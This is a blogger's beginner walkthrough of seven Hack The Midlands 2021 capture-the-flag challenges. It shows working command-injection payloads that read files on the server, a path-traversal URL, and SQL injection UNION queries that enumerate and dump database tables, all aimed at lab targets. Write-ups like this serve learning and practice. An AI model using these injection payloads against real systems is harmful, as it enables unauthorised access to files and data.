---
layout: post
title:  "Hack The Midlands CTF (2021)"
date:   2021-10-31 15:00:38 +0000
categories: ctf professional programming linux
---

[HackTheMidlands][hack-the-midlands] is a 24-hour hackathon, or “creative marathon”, which was founded in 2016.
I used to participate back in the day, and I've even won a prize before, [here][htm-video] you can find a video about it! 📷


### CTFs🏁:
Being a programmer at heart I've never played seriously with [capture the flag][ctf-link] challenges before, but because I am busy with work I did not have the time and energy to participate in the coding part of the hackathon, so I thought I'll give the CTF a try! It was a lot of fun for someone starting out with CTFs but with a good grasp of `*nix` systems, programming, and web development!

# Writeup of the challenges of this year 💻:

There were 7 challenges in total this year, with varying difficulties denoted by points from `5` to `20`. 

Some of the challenges required the `hacker` to download some file and mess around with it in some way and the others presented the user with a hosted `docker` instance. In the case of the docker instance, the hacker did not have to employ any other tools besides his browser. I found this to be very nice for a new user.

# Challenge \#1: Find Me (5pt)
Description: 
```
There's something about this image that is more than meets the eye.
```

Attached to this was an image:
![findMe]({{site.url}}/assets/htm-2021/findMe.png)

Photography is one of my most loved hobbies so I knew this had to be one of three things.
1. There was something hidden in the text when you open up the image as a text file. This was not it. The file looked like gibberish with no sight of the flag:
![findMeGibberish]({{site.url}}/assets/htm-2021/findMeGibberish.png)
2. Sometimes when you adjust the file's brightness or contrast you can see some hidden text. This was unlikely to be the case because then you would have to type the CTF flag manually. I tried it regardless without any success.
3. The file had some [EXIF][exif-info-link] data about it. I went to an online [EXIF viewer][exif-link] and lo and behold, the flag `HTM{EXIF_GRABBED}` was there:
![findMeExif]({{site.url}}/assets/htm-2021/findMeExif.png)

# Challenge \#2: PingIT (5pt)
Description: 
```
TotallySecure Limited have developed an internal tool to check the availability of a host on their network.
Can you find any vulnerabilities with this?
**Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}**
```

This is what the website looked like upon visiting it:

![pingitsite]({{site.url}}/assets/htm-2021/pingitsite.png)

It`s quite clear that the website takes the user input and passes it to the ping command directly, something like this:
```bash
ping 127.0.0.1
```
In `bash` if you want to run two commands one after the other, you can use the `;` sign between them. So I tried to run `uname` which should return the kernel name I am running on that machine. And it did!

![pingmeuname]({{site.url}}/assets/htm-2021/pingmeuname.png)

It says in the description that the flag is located in `/home/cmnatic`. I just don't know what the name of the file is, so I ran 
```bash
1; ls /home/cmnatic
```
And the server told me that the file is called `flag.txt`. Should`ve known...
All that is left now is to read the flag with:
```bash
1; cat /home/cmnatic/flag.txt
```

Tada! We got the flag: `HTM{COMMAND_INJECTION}`

# Challenge \#3: Commitment Issues (15pt)
Description: 
```
Joe Bloggs -
developer extroadinare, has some commitment issues and seems to share too much.
Can you help him prevent this in the future?
```

Attached we have a zip file, with a git project inside.
I tried running `grep` over the file and looking for `HTM{` but I couldn`t find anything.

```bash
tymscar@machine:/home/Tymscar/BikeIT$ grep -rni "HTM{" *
tymscar@machine:/home/Tymscar/BikeIT$
```

It was pretty clear based on the fact that this was a git project and the challenge title that the flag had something to do with the commits inside of it, so I ran ```git log``` and I could see that there was actually another commit which could hide the flag.

```bash
tymscar@machine:/home/Tymscar/BikeIT$ git log
commit eed89b082d6ae5694caa55a4bfe232f866311634 (HEAD -> main, origin/main)
Author: Ben (CMNatic) <ben@cmnatic.co.uk>
Date:   Wed Oct 27 12:12:20 2021 +0100

    Update databaseconfig.php

commit b574d38d27ce5646bf69c28e02ac6f8656c19d2d
Author: Ben (CMNatic) <ben@cmnatic.co.uk>
Date:   Wed Oct 27 10:02:38 2021 +0100

    Initial Commit

commit b9620c9fbfb1ee3714a79fc2d116bff03918a181
Author: Ben (CMNatic) <ben@cmnatic.co.uk>
Date:   Wed Oct 27 09:58:52 2021 +0100

    Initial commit
```

I switched to it, tried grepping for the flag again and, success: `HTM{COMMITTED_CREDENTIALS}`

```bash
tymscar@machine:/home/Tymscar/BikeIT$ git checkout b574d38d27ce5646bf69c28e02ac6f8656c19d2d
Note: switching to 'b574d38d27ce5646bf69c28e02ac6f8656c19d2d'.

HEAD is now at b574d38 Initial Commit
tymscar@machine:/home/Tymscar/BikeIT$ grep -rni "HTM{" *
php/databaseconfig.php:5:$password="HTM{COMMITTED_CREDENTIALS}"; //change this
```

# Challenge \#4:Totally Cool Bookings (10pt)
Description: 
```
Totally Cool Bookings are excited to show off their new app!
It makes bookings totally cool and easy.
Find the vulnerability on their site to answer the flag.
**Note, flags for this are with the formatting of HTM{}**
and are located in a users home directory
```

This is what the website looked like upon visiting it:

![coolbookingsinital]({{site.url}}/assets/htm-2021/coolbookingsinital.png)

The first thing I noticed instantly while playing with the webpage was that when I went to the `about` page, it would not load, but instead, it would error at the bottom of the page:
![coolbookingserror]({{site.url}}/assets/htm-2021/coolbookingserror.png)

The error had a full path to where the page should've been `/opt/web/about.html`. Does this mean we can just change the URL and relatively go back to root and then climb back up to the location of where the flag was in `Challenge 2`? Let's try: `{dockerinstanceURL}/home?page=../../../home/cmnatic/flag.txt`
![coolbookingssuccess]({{site.url}}/assets/htm-2021/coolbookingssuccess.png)

What do you know? We found the flag: `HTM{INJECTION_SUCCESS}`! 

# Challenge \#5: Deep Dive (15pt)
Description: 
```
The DevOps team left a flag behind.
Can you re-assemble this and find the flag?

Note, any flags are located in /home/cmnatic/ with the formatting of HTM{}
```

Attached we have a zip file, with a docker project inside. Normally, I would've tried to run the docker file and see where it would take me, but a simple
```bash
grep -rni "HTM{.*}" *
```
returned me the flag `HTM{DOCKER_DIVE}` so I was happy enough:
![deepdive]({{site.url}}/assets/htm-2021/deepdive.png)


# Challenge \#6: Flag Checker (10pt)
Description: 
```
The lazy developer has left this broken file behind.
Can you find the flag?
```

Attached we have a zip file, with a single file inside.
The first thing I did was try to see what kind of file it is:
```bash
tymscar@machine:/home/Tymscar/flagchecker$ file flagchecker
flagchecker: assembler source, ASCII text
```

Being an ASCII file, I did what you probably guessed:
```bash
tymscar@machine:/home/Tymscar/flagchecker$ cat flagchecker | grep "HTM{.*}"
HTM{CORE_DU}
```
And there it was, `HTM{CORE_DU}`, the flag!

# Challenge \#7: Address Book (20pt)
Description: 
```
Alice is trying to find the contact details for **Joe Bloggs**.
Can you help here?
I hear the address book contains more then just contact details!
```

This is what the website looked like upon visiting it and searching for the person hinted in the description:

![addressbook]({{site.url}}/assets/htm-2021/addressbook.png)

Searching for any other random name did not yield any results. I knew this was accessing data inside of some sort of database, so I tried my hand at doing an SQL injection attack.
My train of thought was that because this is a simple docker instance it might just use SQLite. If it does it should respond to ```sqlite_version()``` with the version it has, if it doesn't, then I could try other variants of SQL and their specific commands.

But how would I be able to run that?
Well, I could assume that the SQL command on the backend looks something like this:
```sql
select * from sometablethatIdontknow where name='{USERINPUT}'
```

I can add anything as USERINPUT, so I will close out the quotes, get rid of the answer by `AND`ing it with a false statement, and using a union to select the version I am looking for: 
```
blahblah' AND 1=2 UNION SELECT sqlite_version(), 1, 1 --
```
This interanlly it would look like:
```sql
select * from sometablethatIdontknow where name='blahblah' AND 1=2 UNION SELECT sqlite_version(), 1, 1 --'
```

The other 2 `1`'s there I need just to be able to fully populate the table on the website which needs 3 elements in total.

I got lucky! The database was in fact an SQLite database and it returned its version:
![addressbookversion]({{site.url}}/assets/htm-2021/addressbookversion.png)

Now that we know what database there is, I can always query all the table names. To do that in SQL, my input became:
```
blahblah' AND 1=2 UNION SELECT name, 1, 1 FROM sqlite_master WHERE type = "table" --
```
which in turn on the backend side looked something like:
```sql
select * from sometablethatIdontknow where name='blahblah' AND 1=2 UNION SELECT name, 1, 1 FROM sqlite_master WHERE type = "table" --'
```

This returned the name of the tables available in that database. There is a `flag` table! That's what we want. To list everything inside of it, we do the last injection:
```
blahblah' AND 1=2 UNION SELECT *, 1, 1 FROM flag--
```
which then in turn on the backend side would look like:
```sql
select * from addressbook where name='blahblah' AND 1=2 UNION SELECT *, 1, 1 FROM flag--'
```

That was it! The flag, `HTM{ADDRESS_BOOK_INJECTION}` was mine!
![addressbookflag]({{site.url}}/assets/htm-2021/addressbookflag.png)


# In conclusion

I enjoyed these challenges very much! The last one was especially hard because I had to poke around with SQL injection about which I heard before but I've never done myself.
The best advice I could give to anybody that wants to try some of these is just `go for it` and don't be afraid to Google everything you don`t understand. After all, it is a great learning experience!

See you next time!

[hack-the-midlands]: https://hackthemidlands.com/
[htm-video]: https://www.youtube.com/watch?v=mvLXkCgsXik
[ctf-link]: https://www.hackthebox.com/blog/what-is-ctf
[exif-info-link]: https://en.wikipedia.org/wiki/Exif
[exif-link]: http://metapicz.com/#landing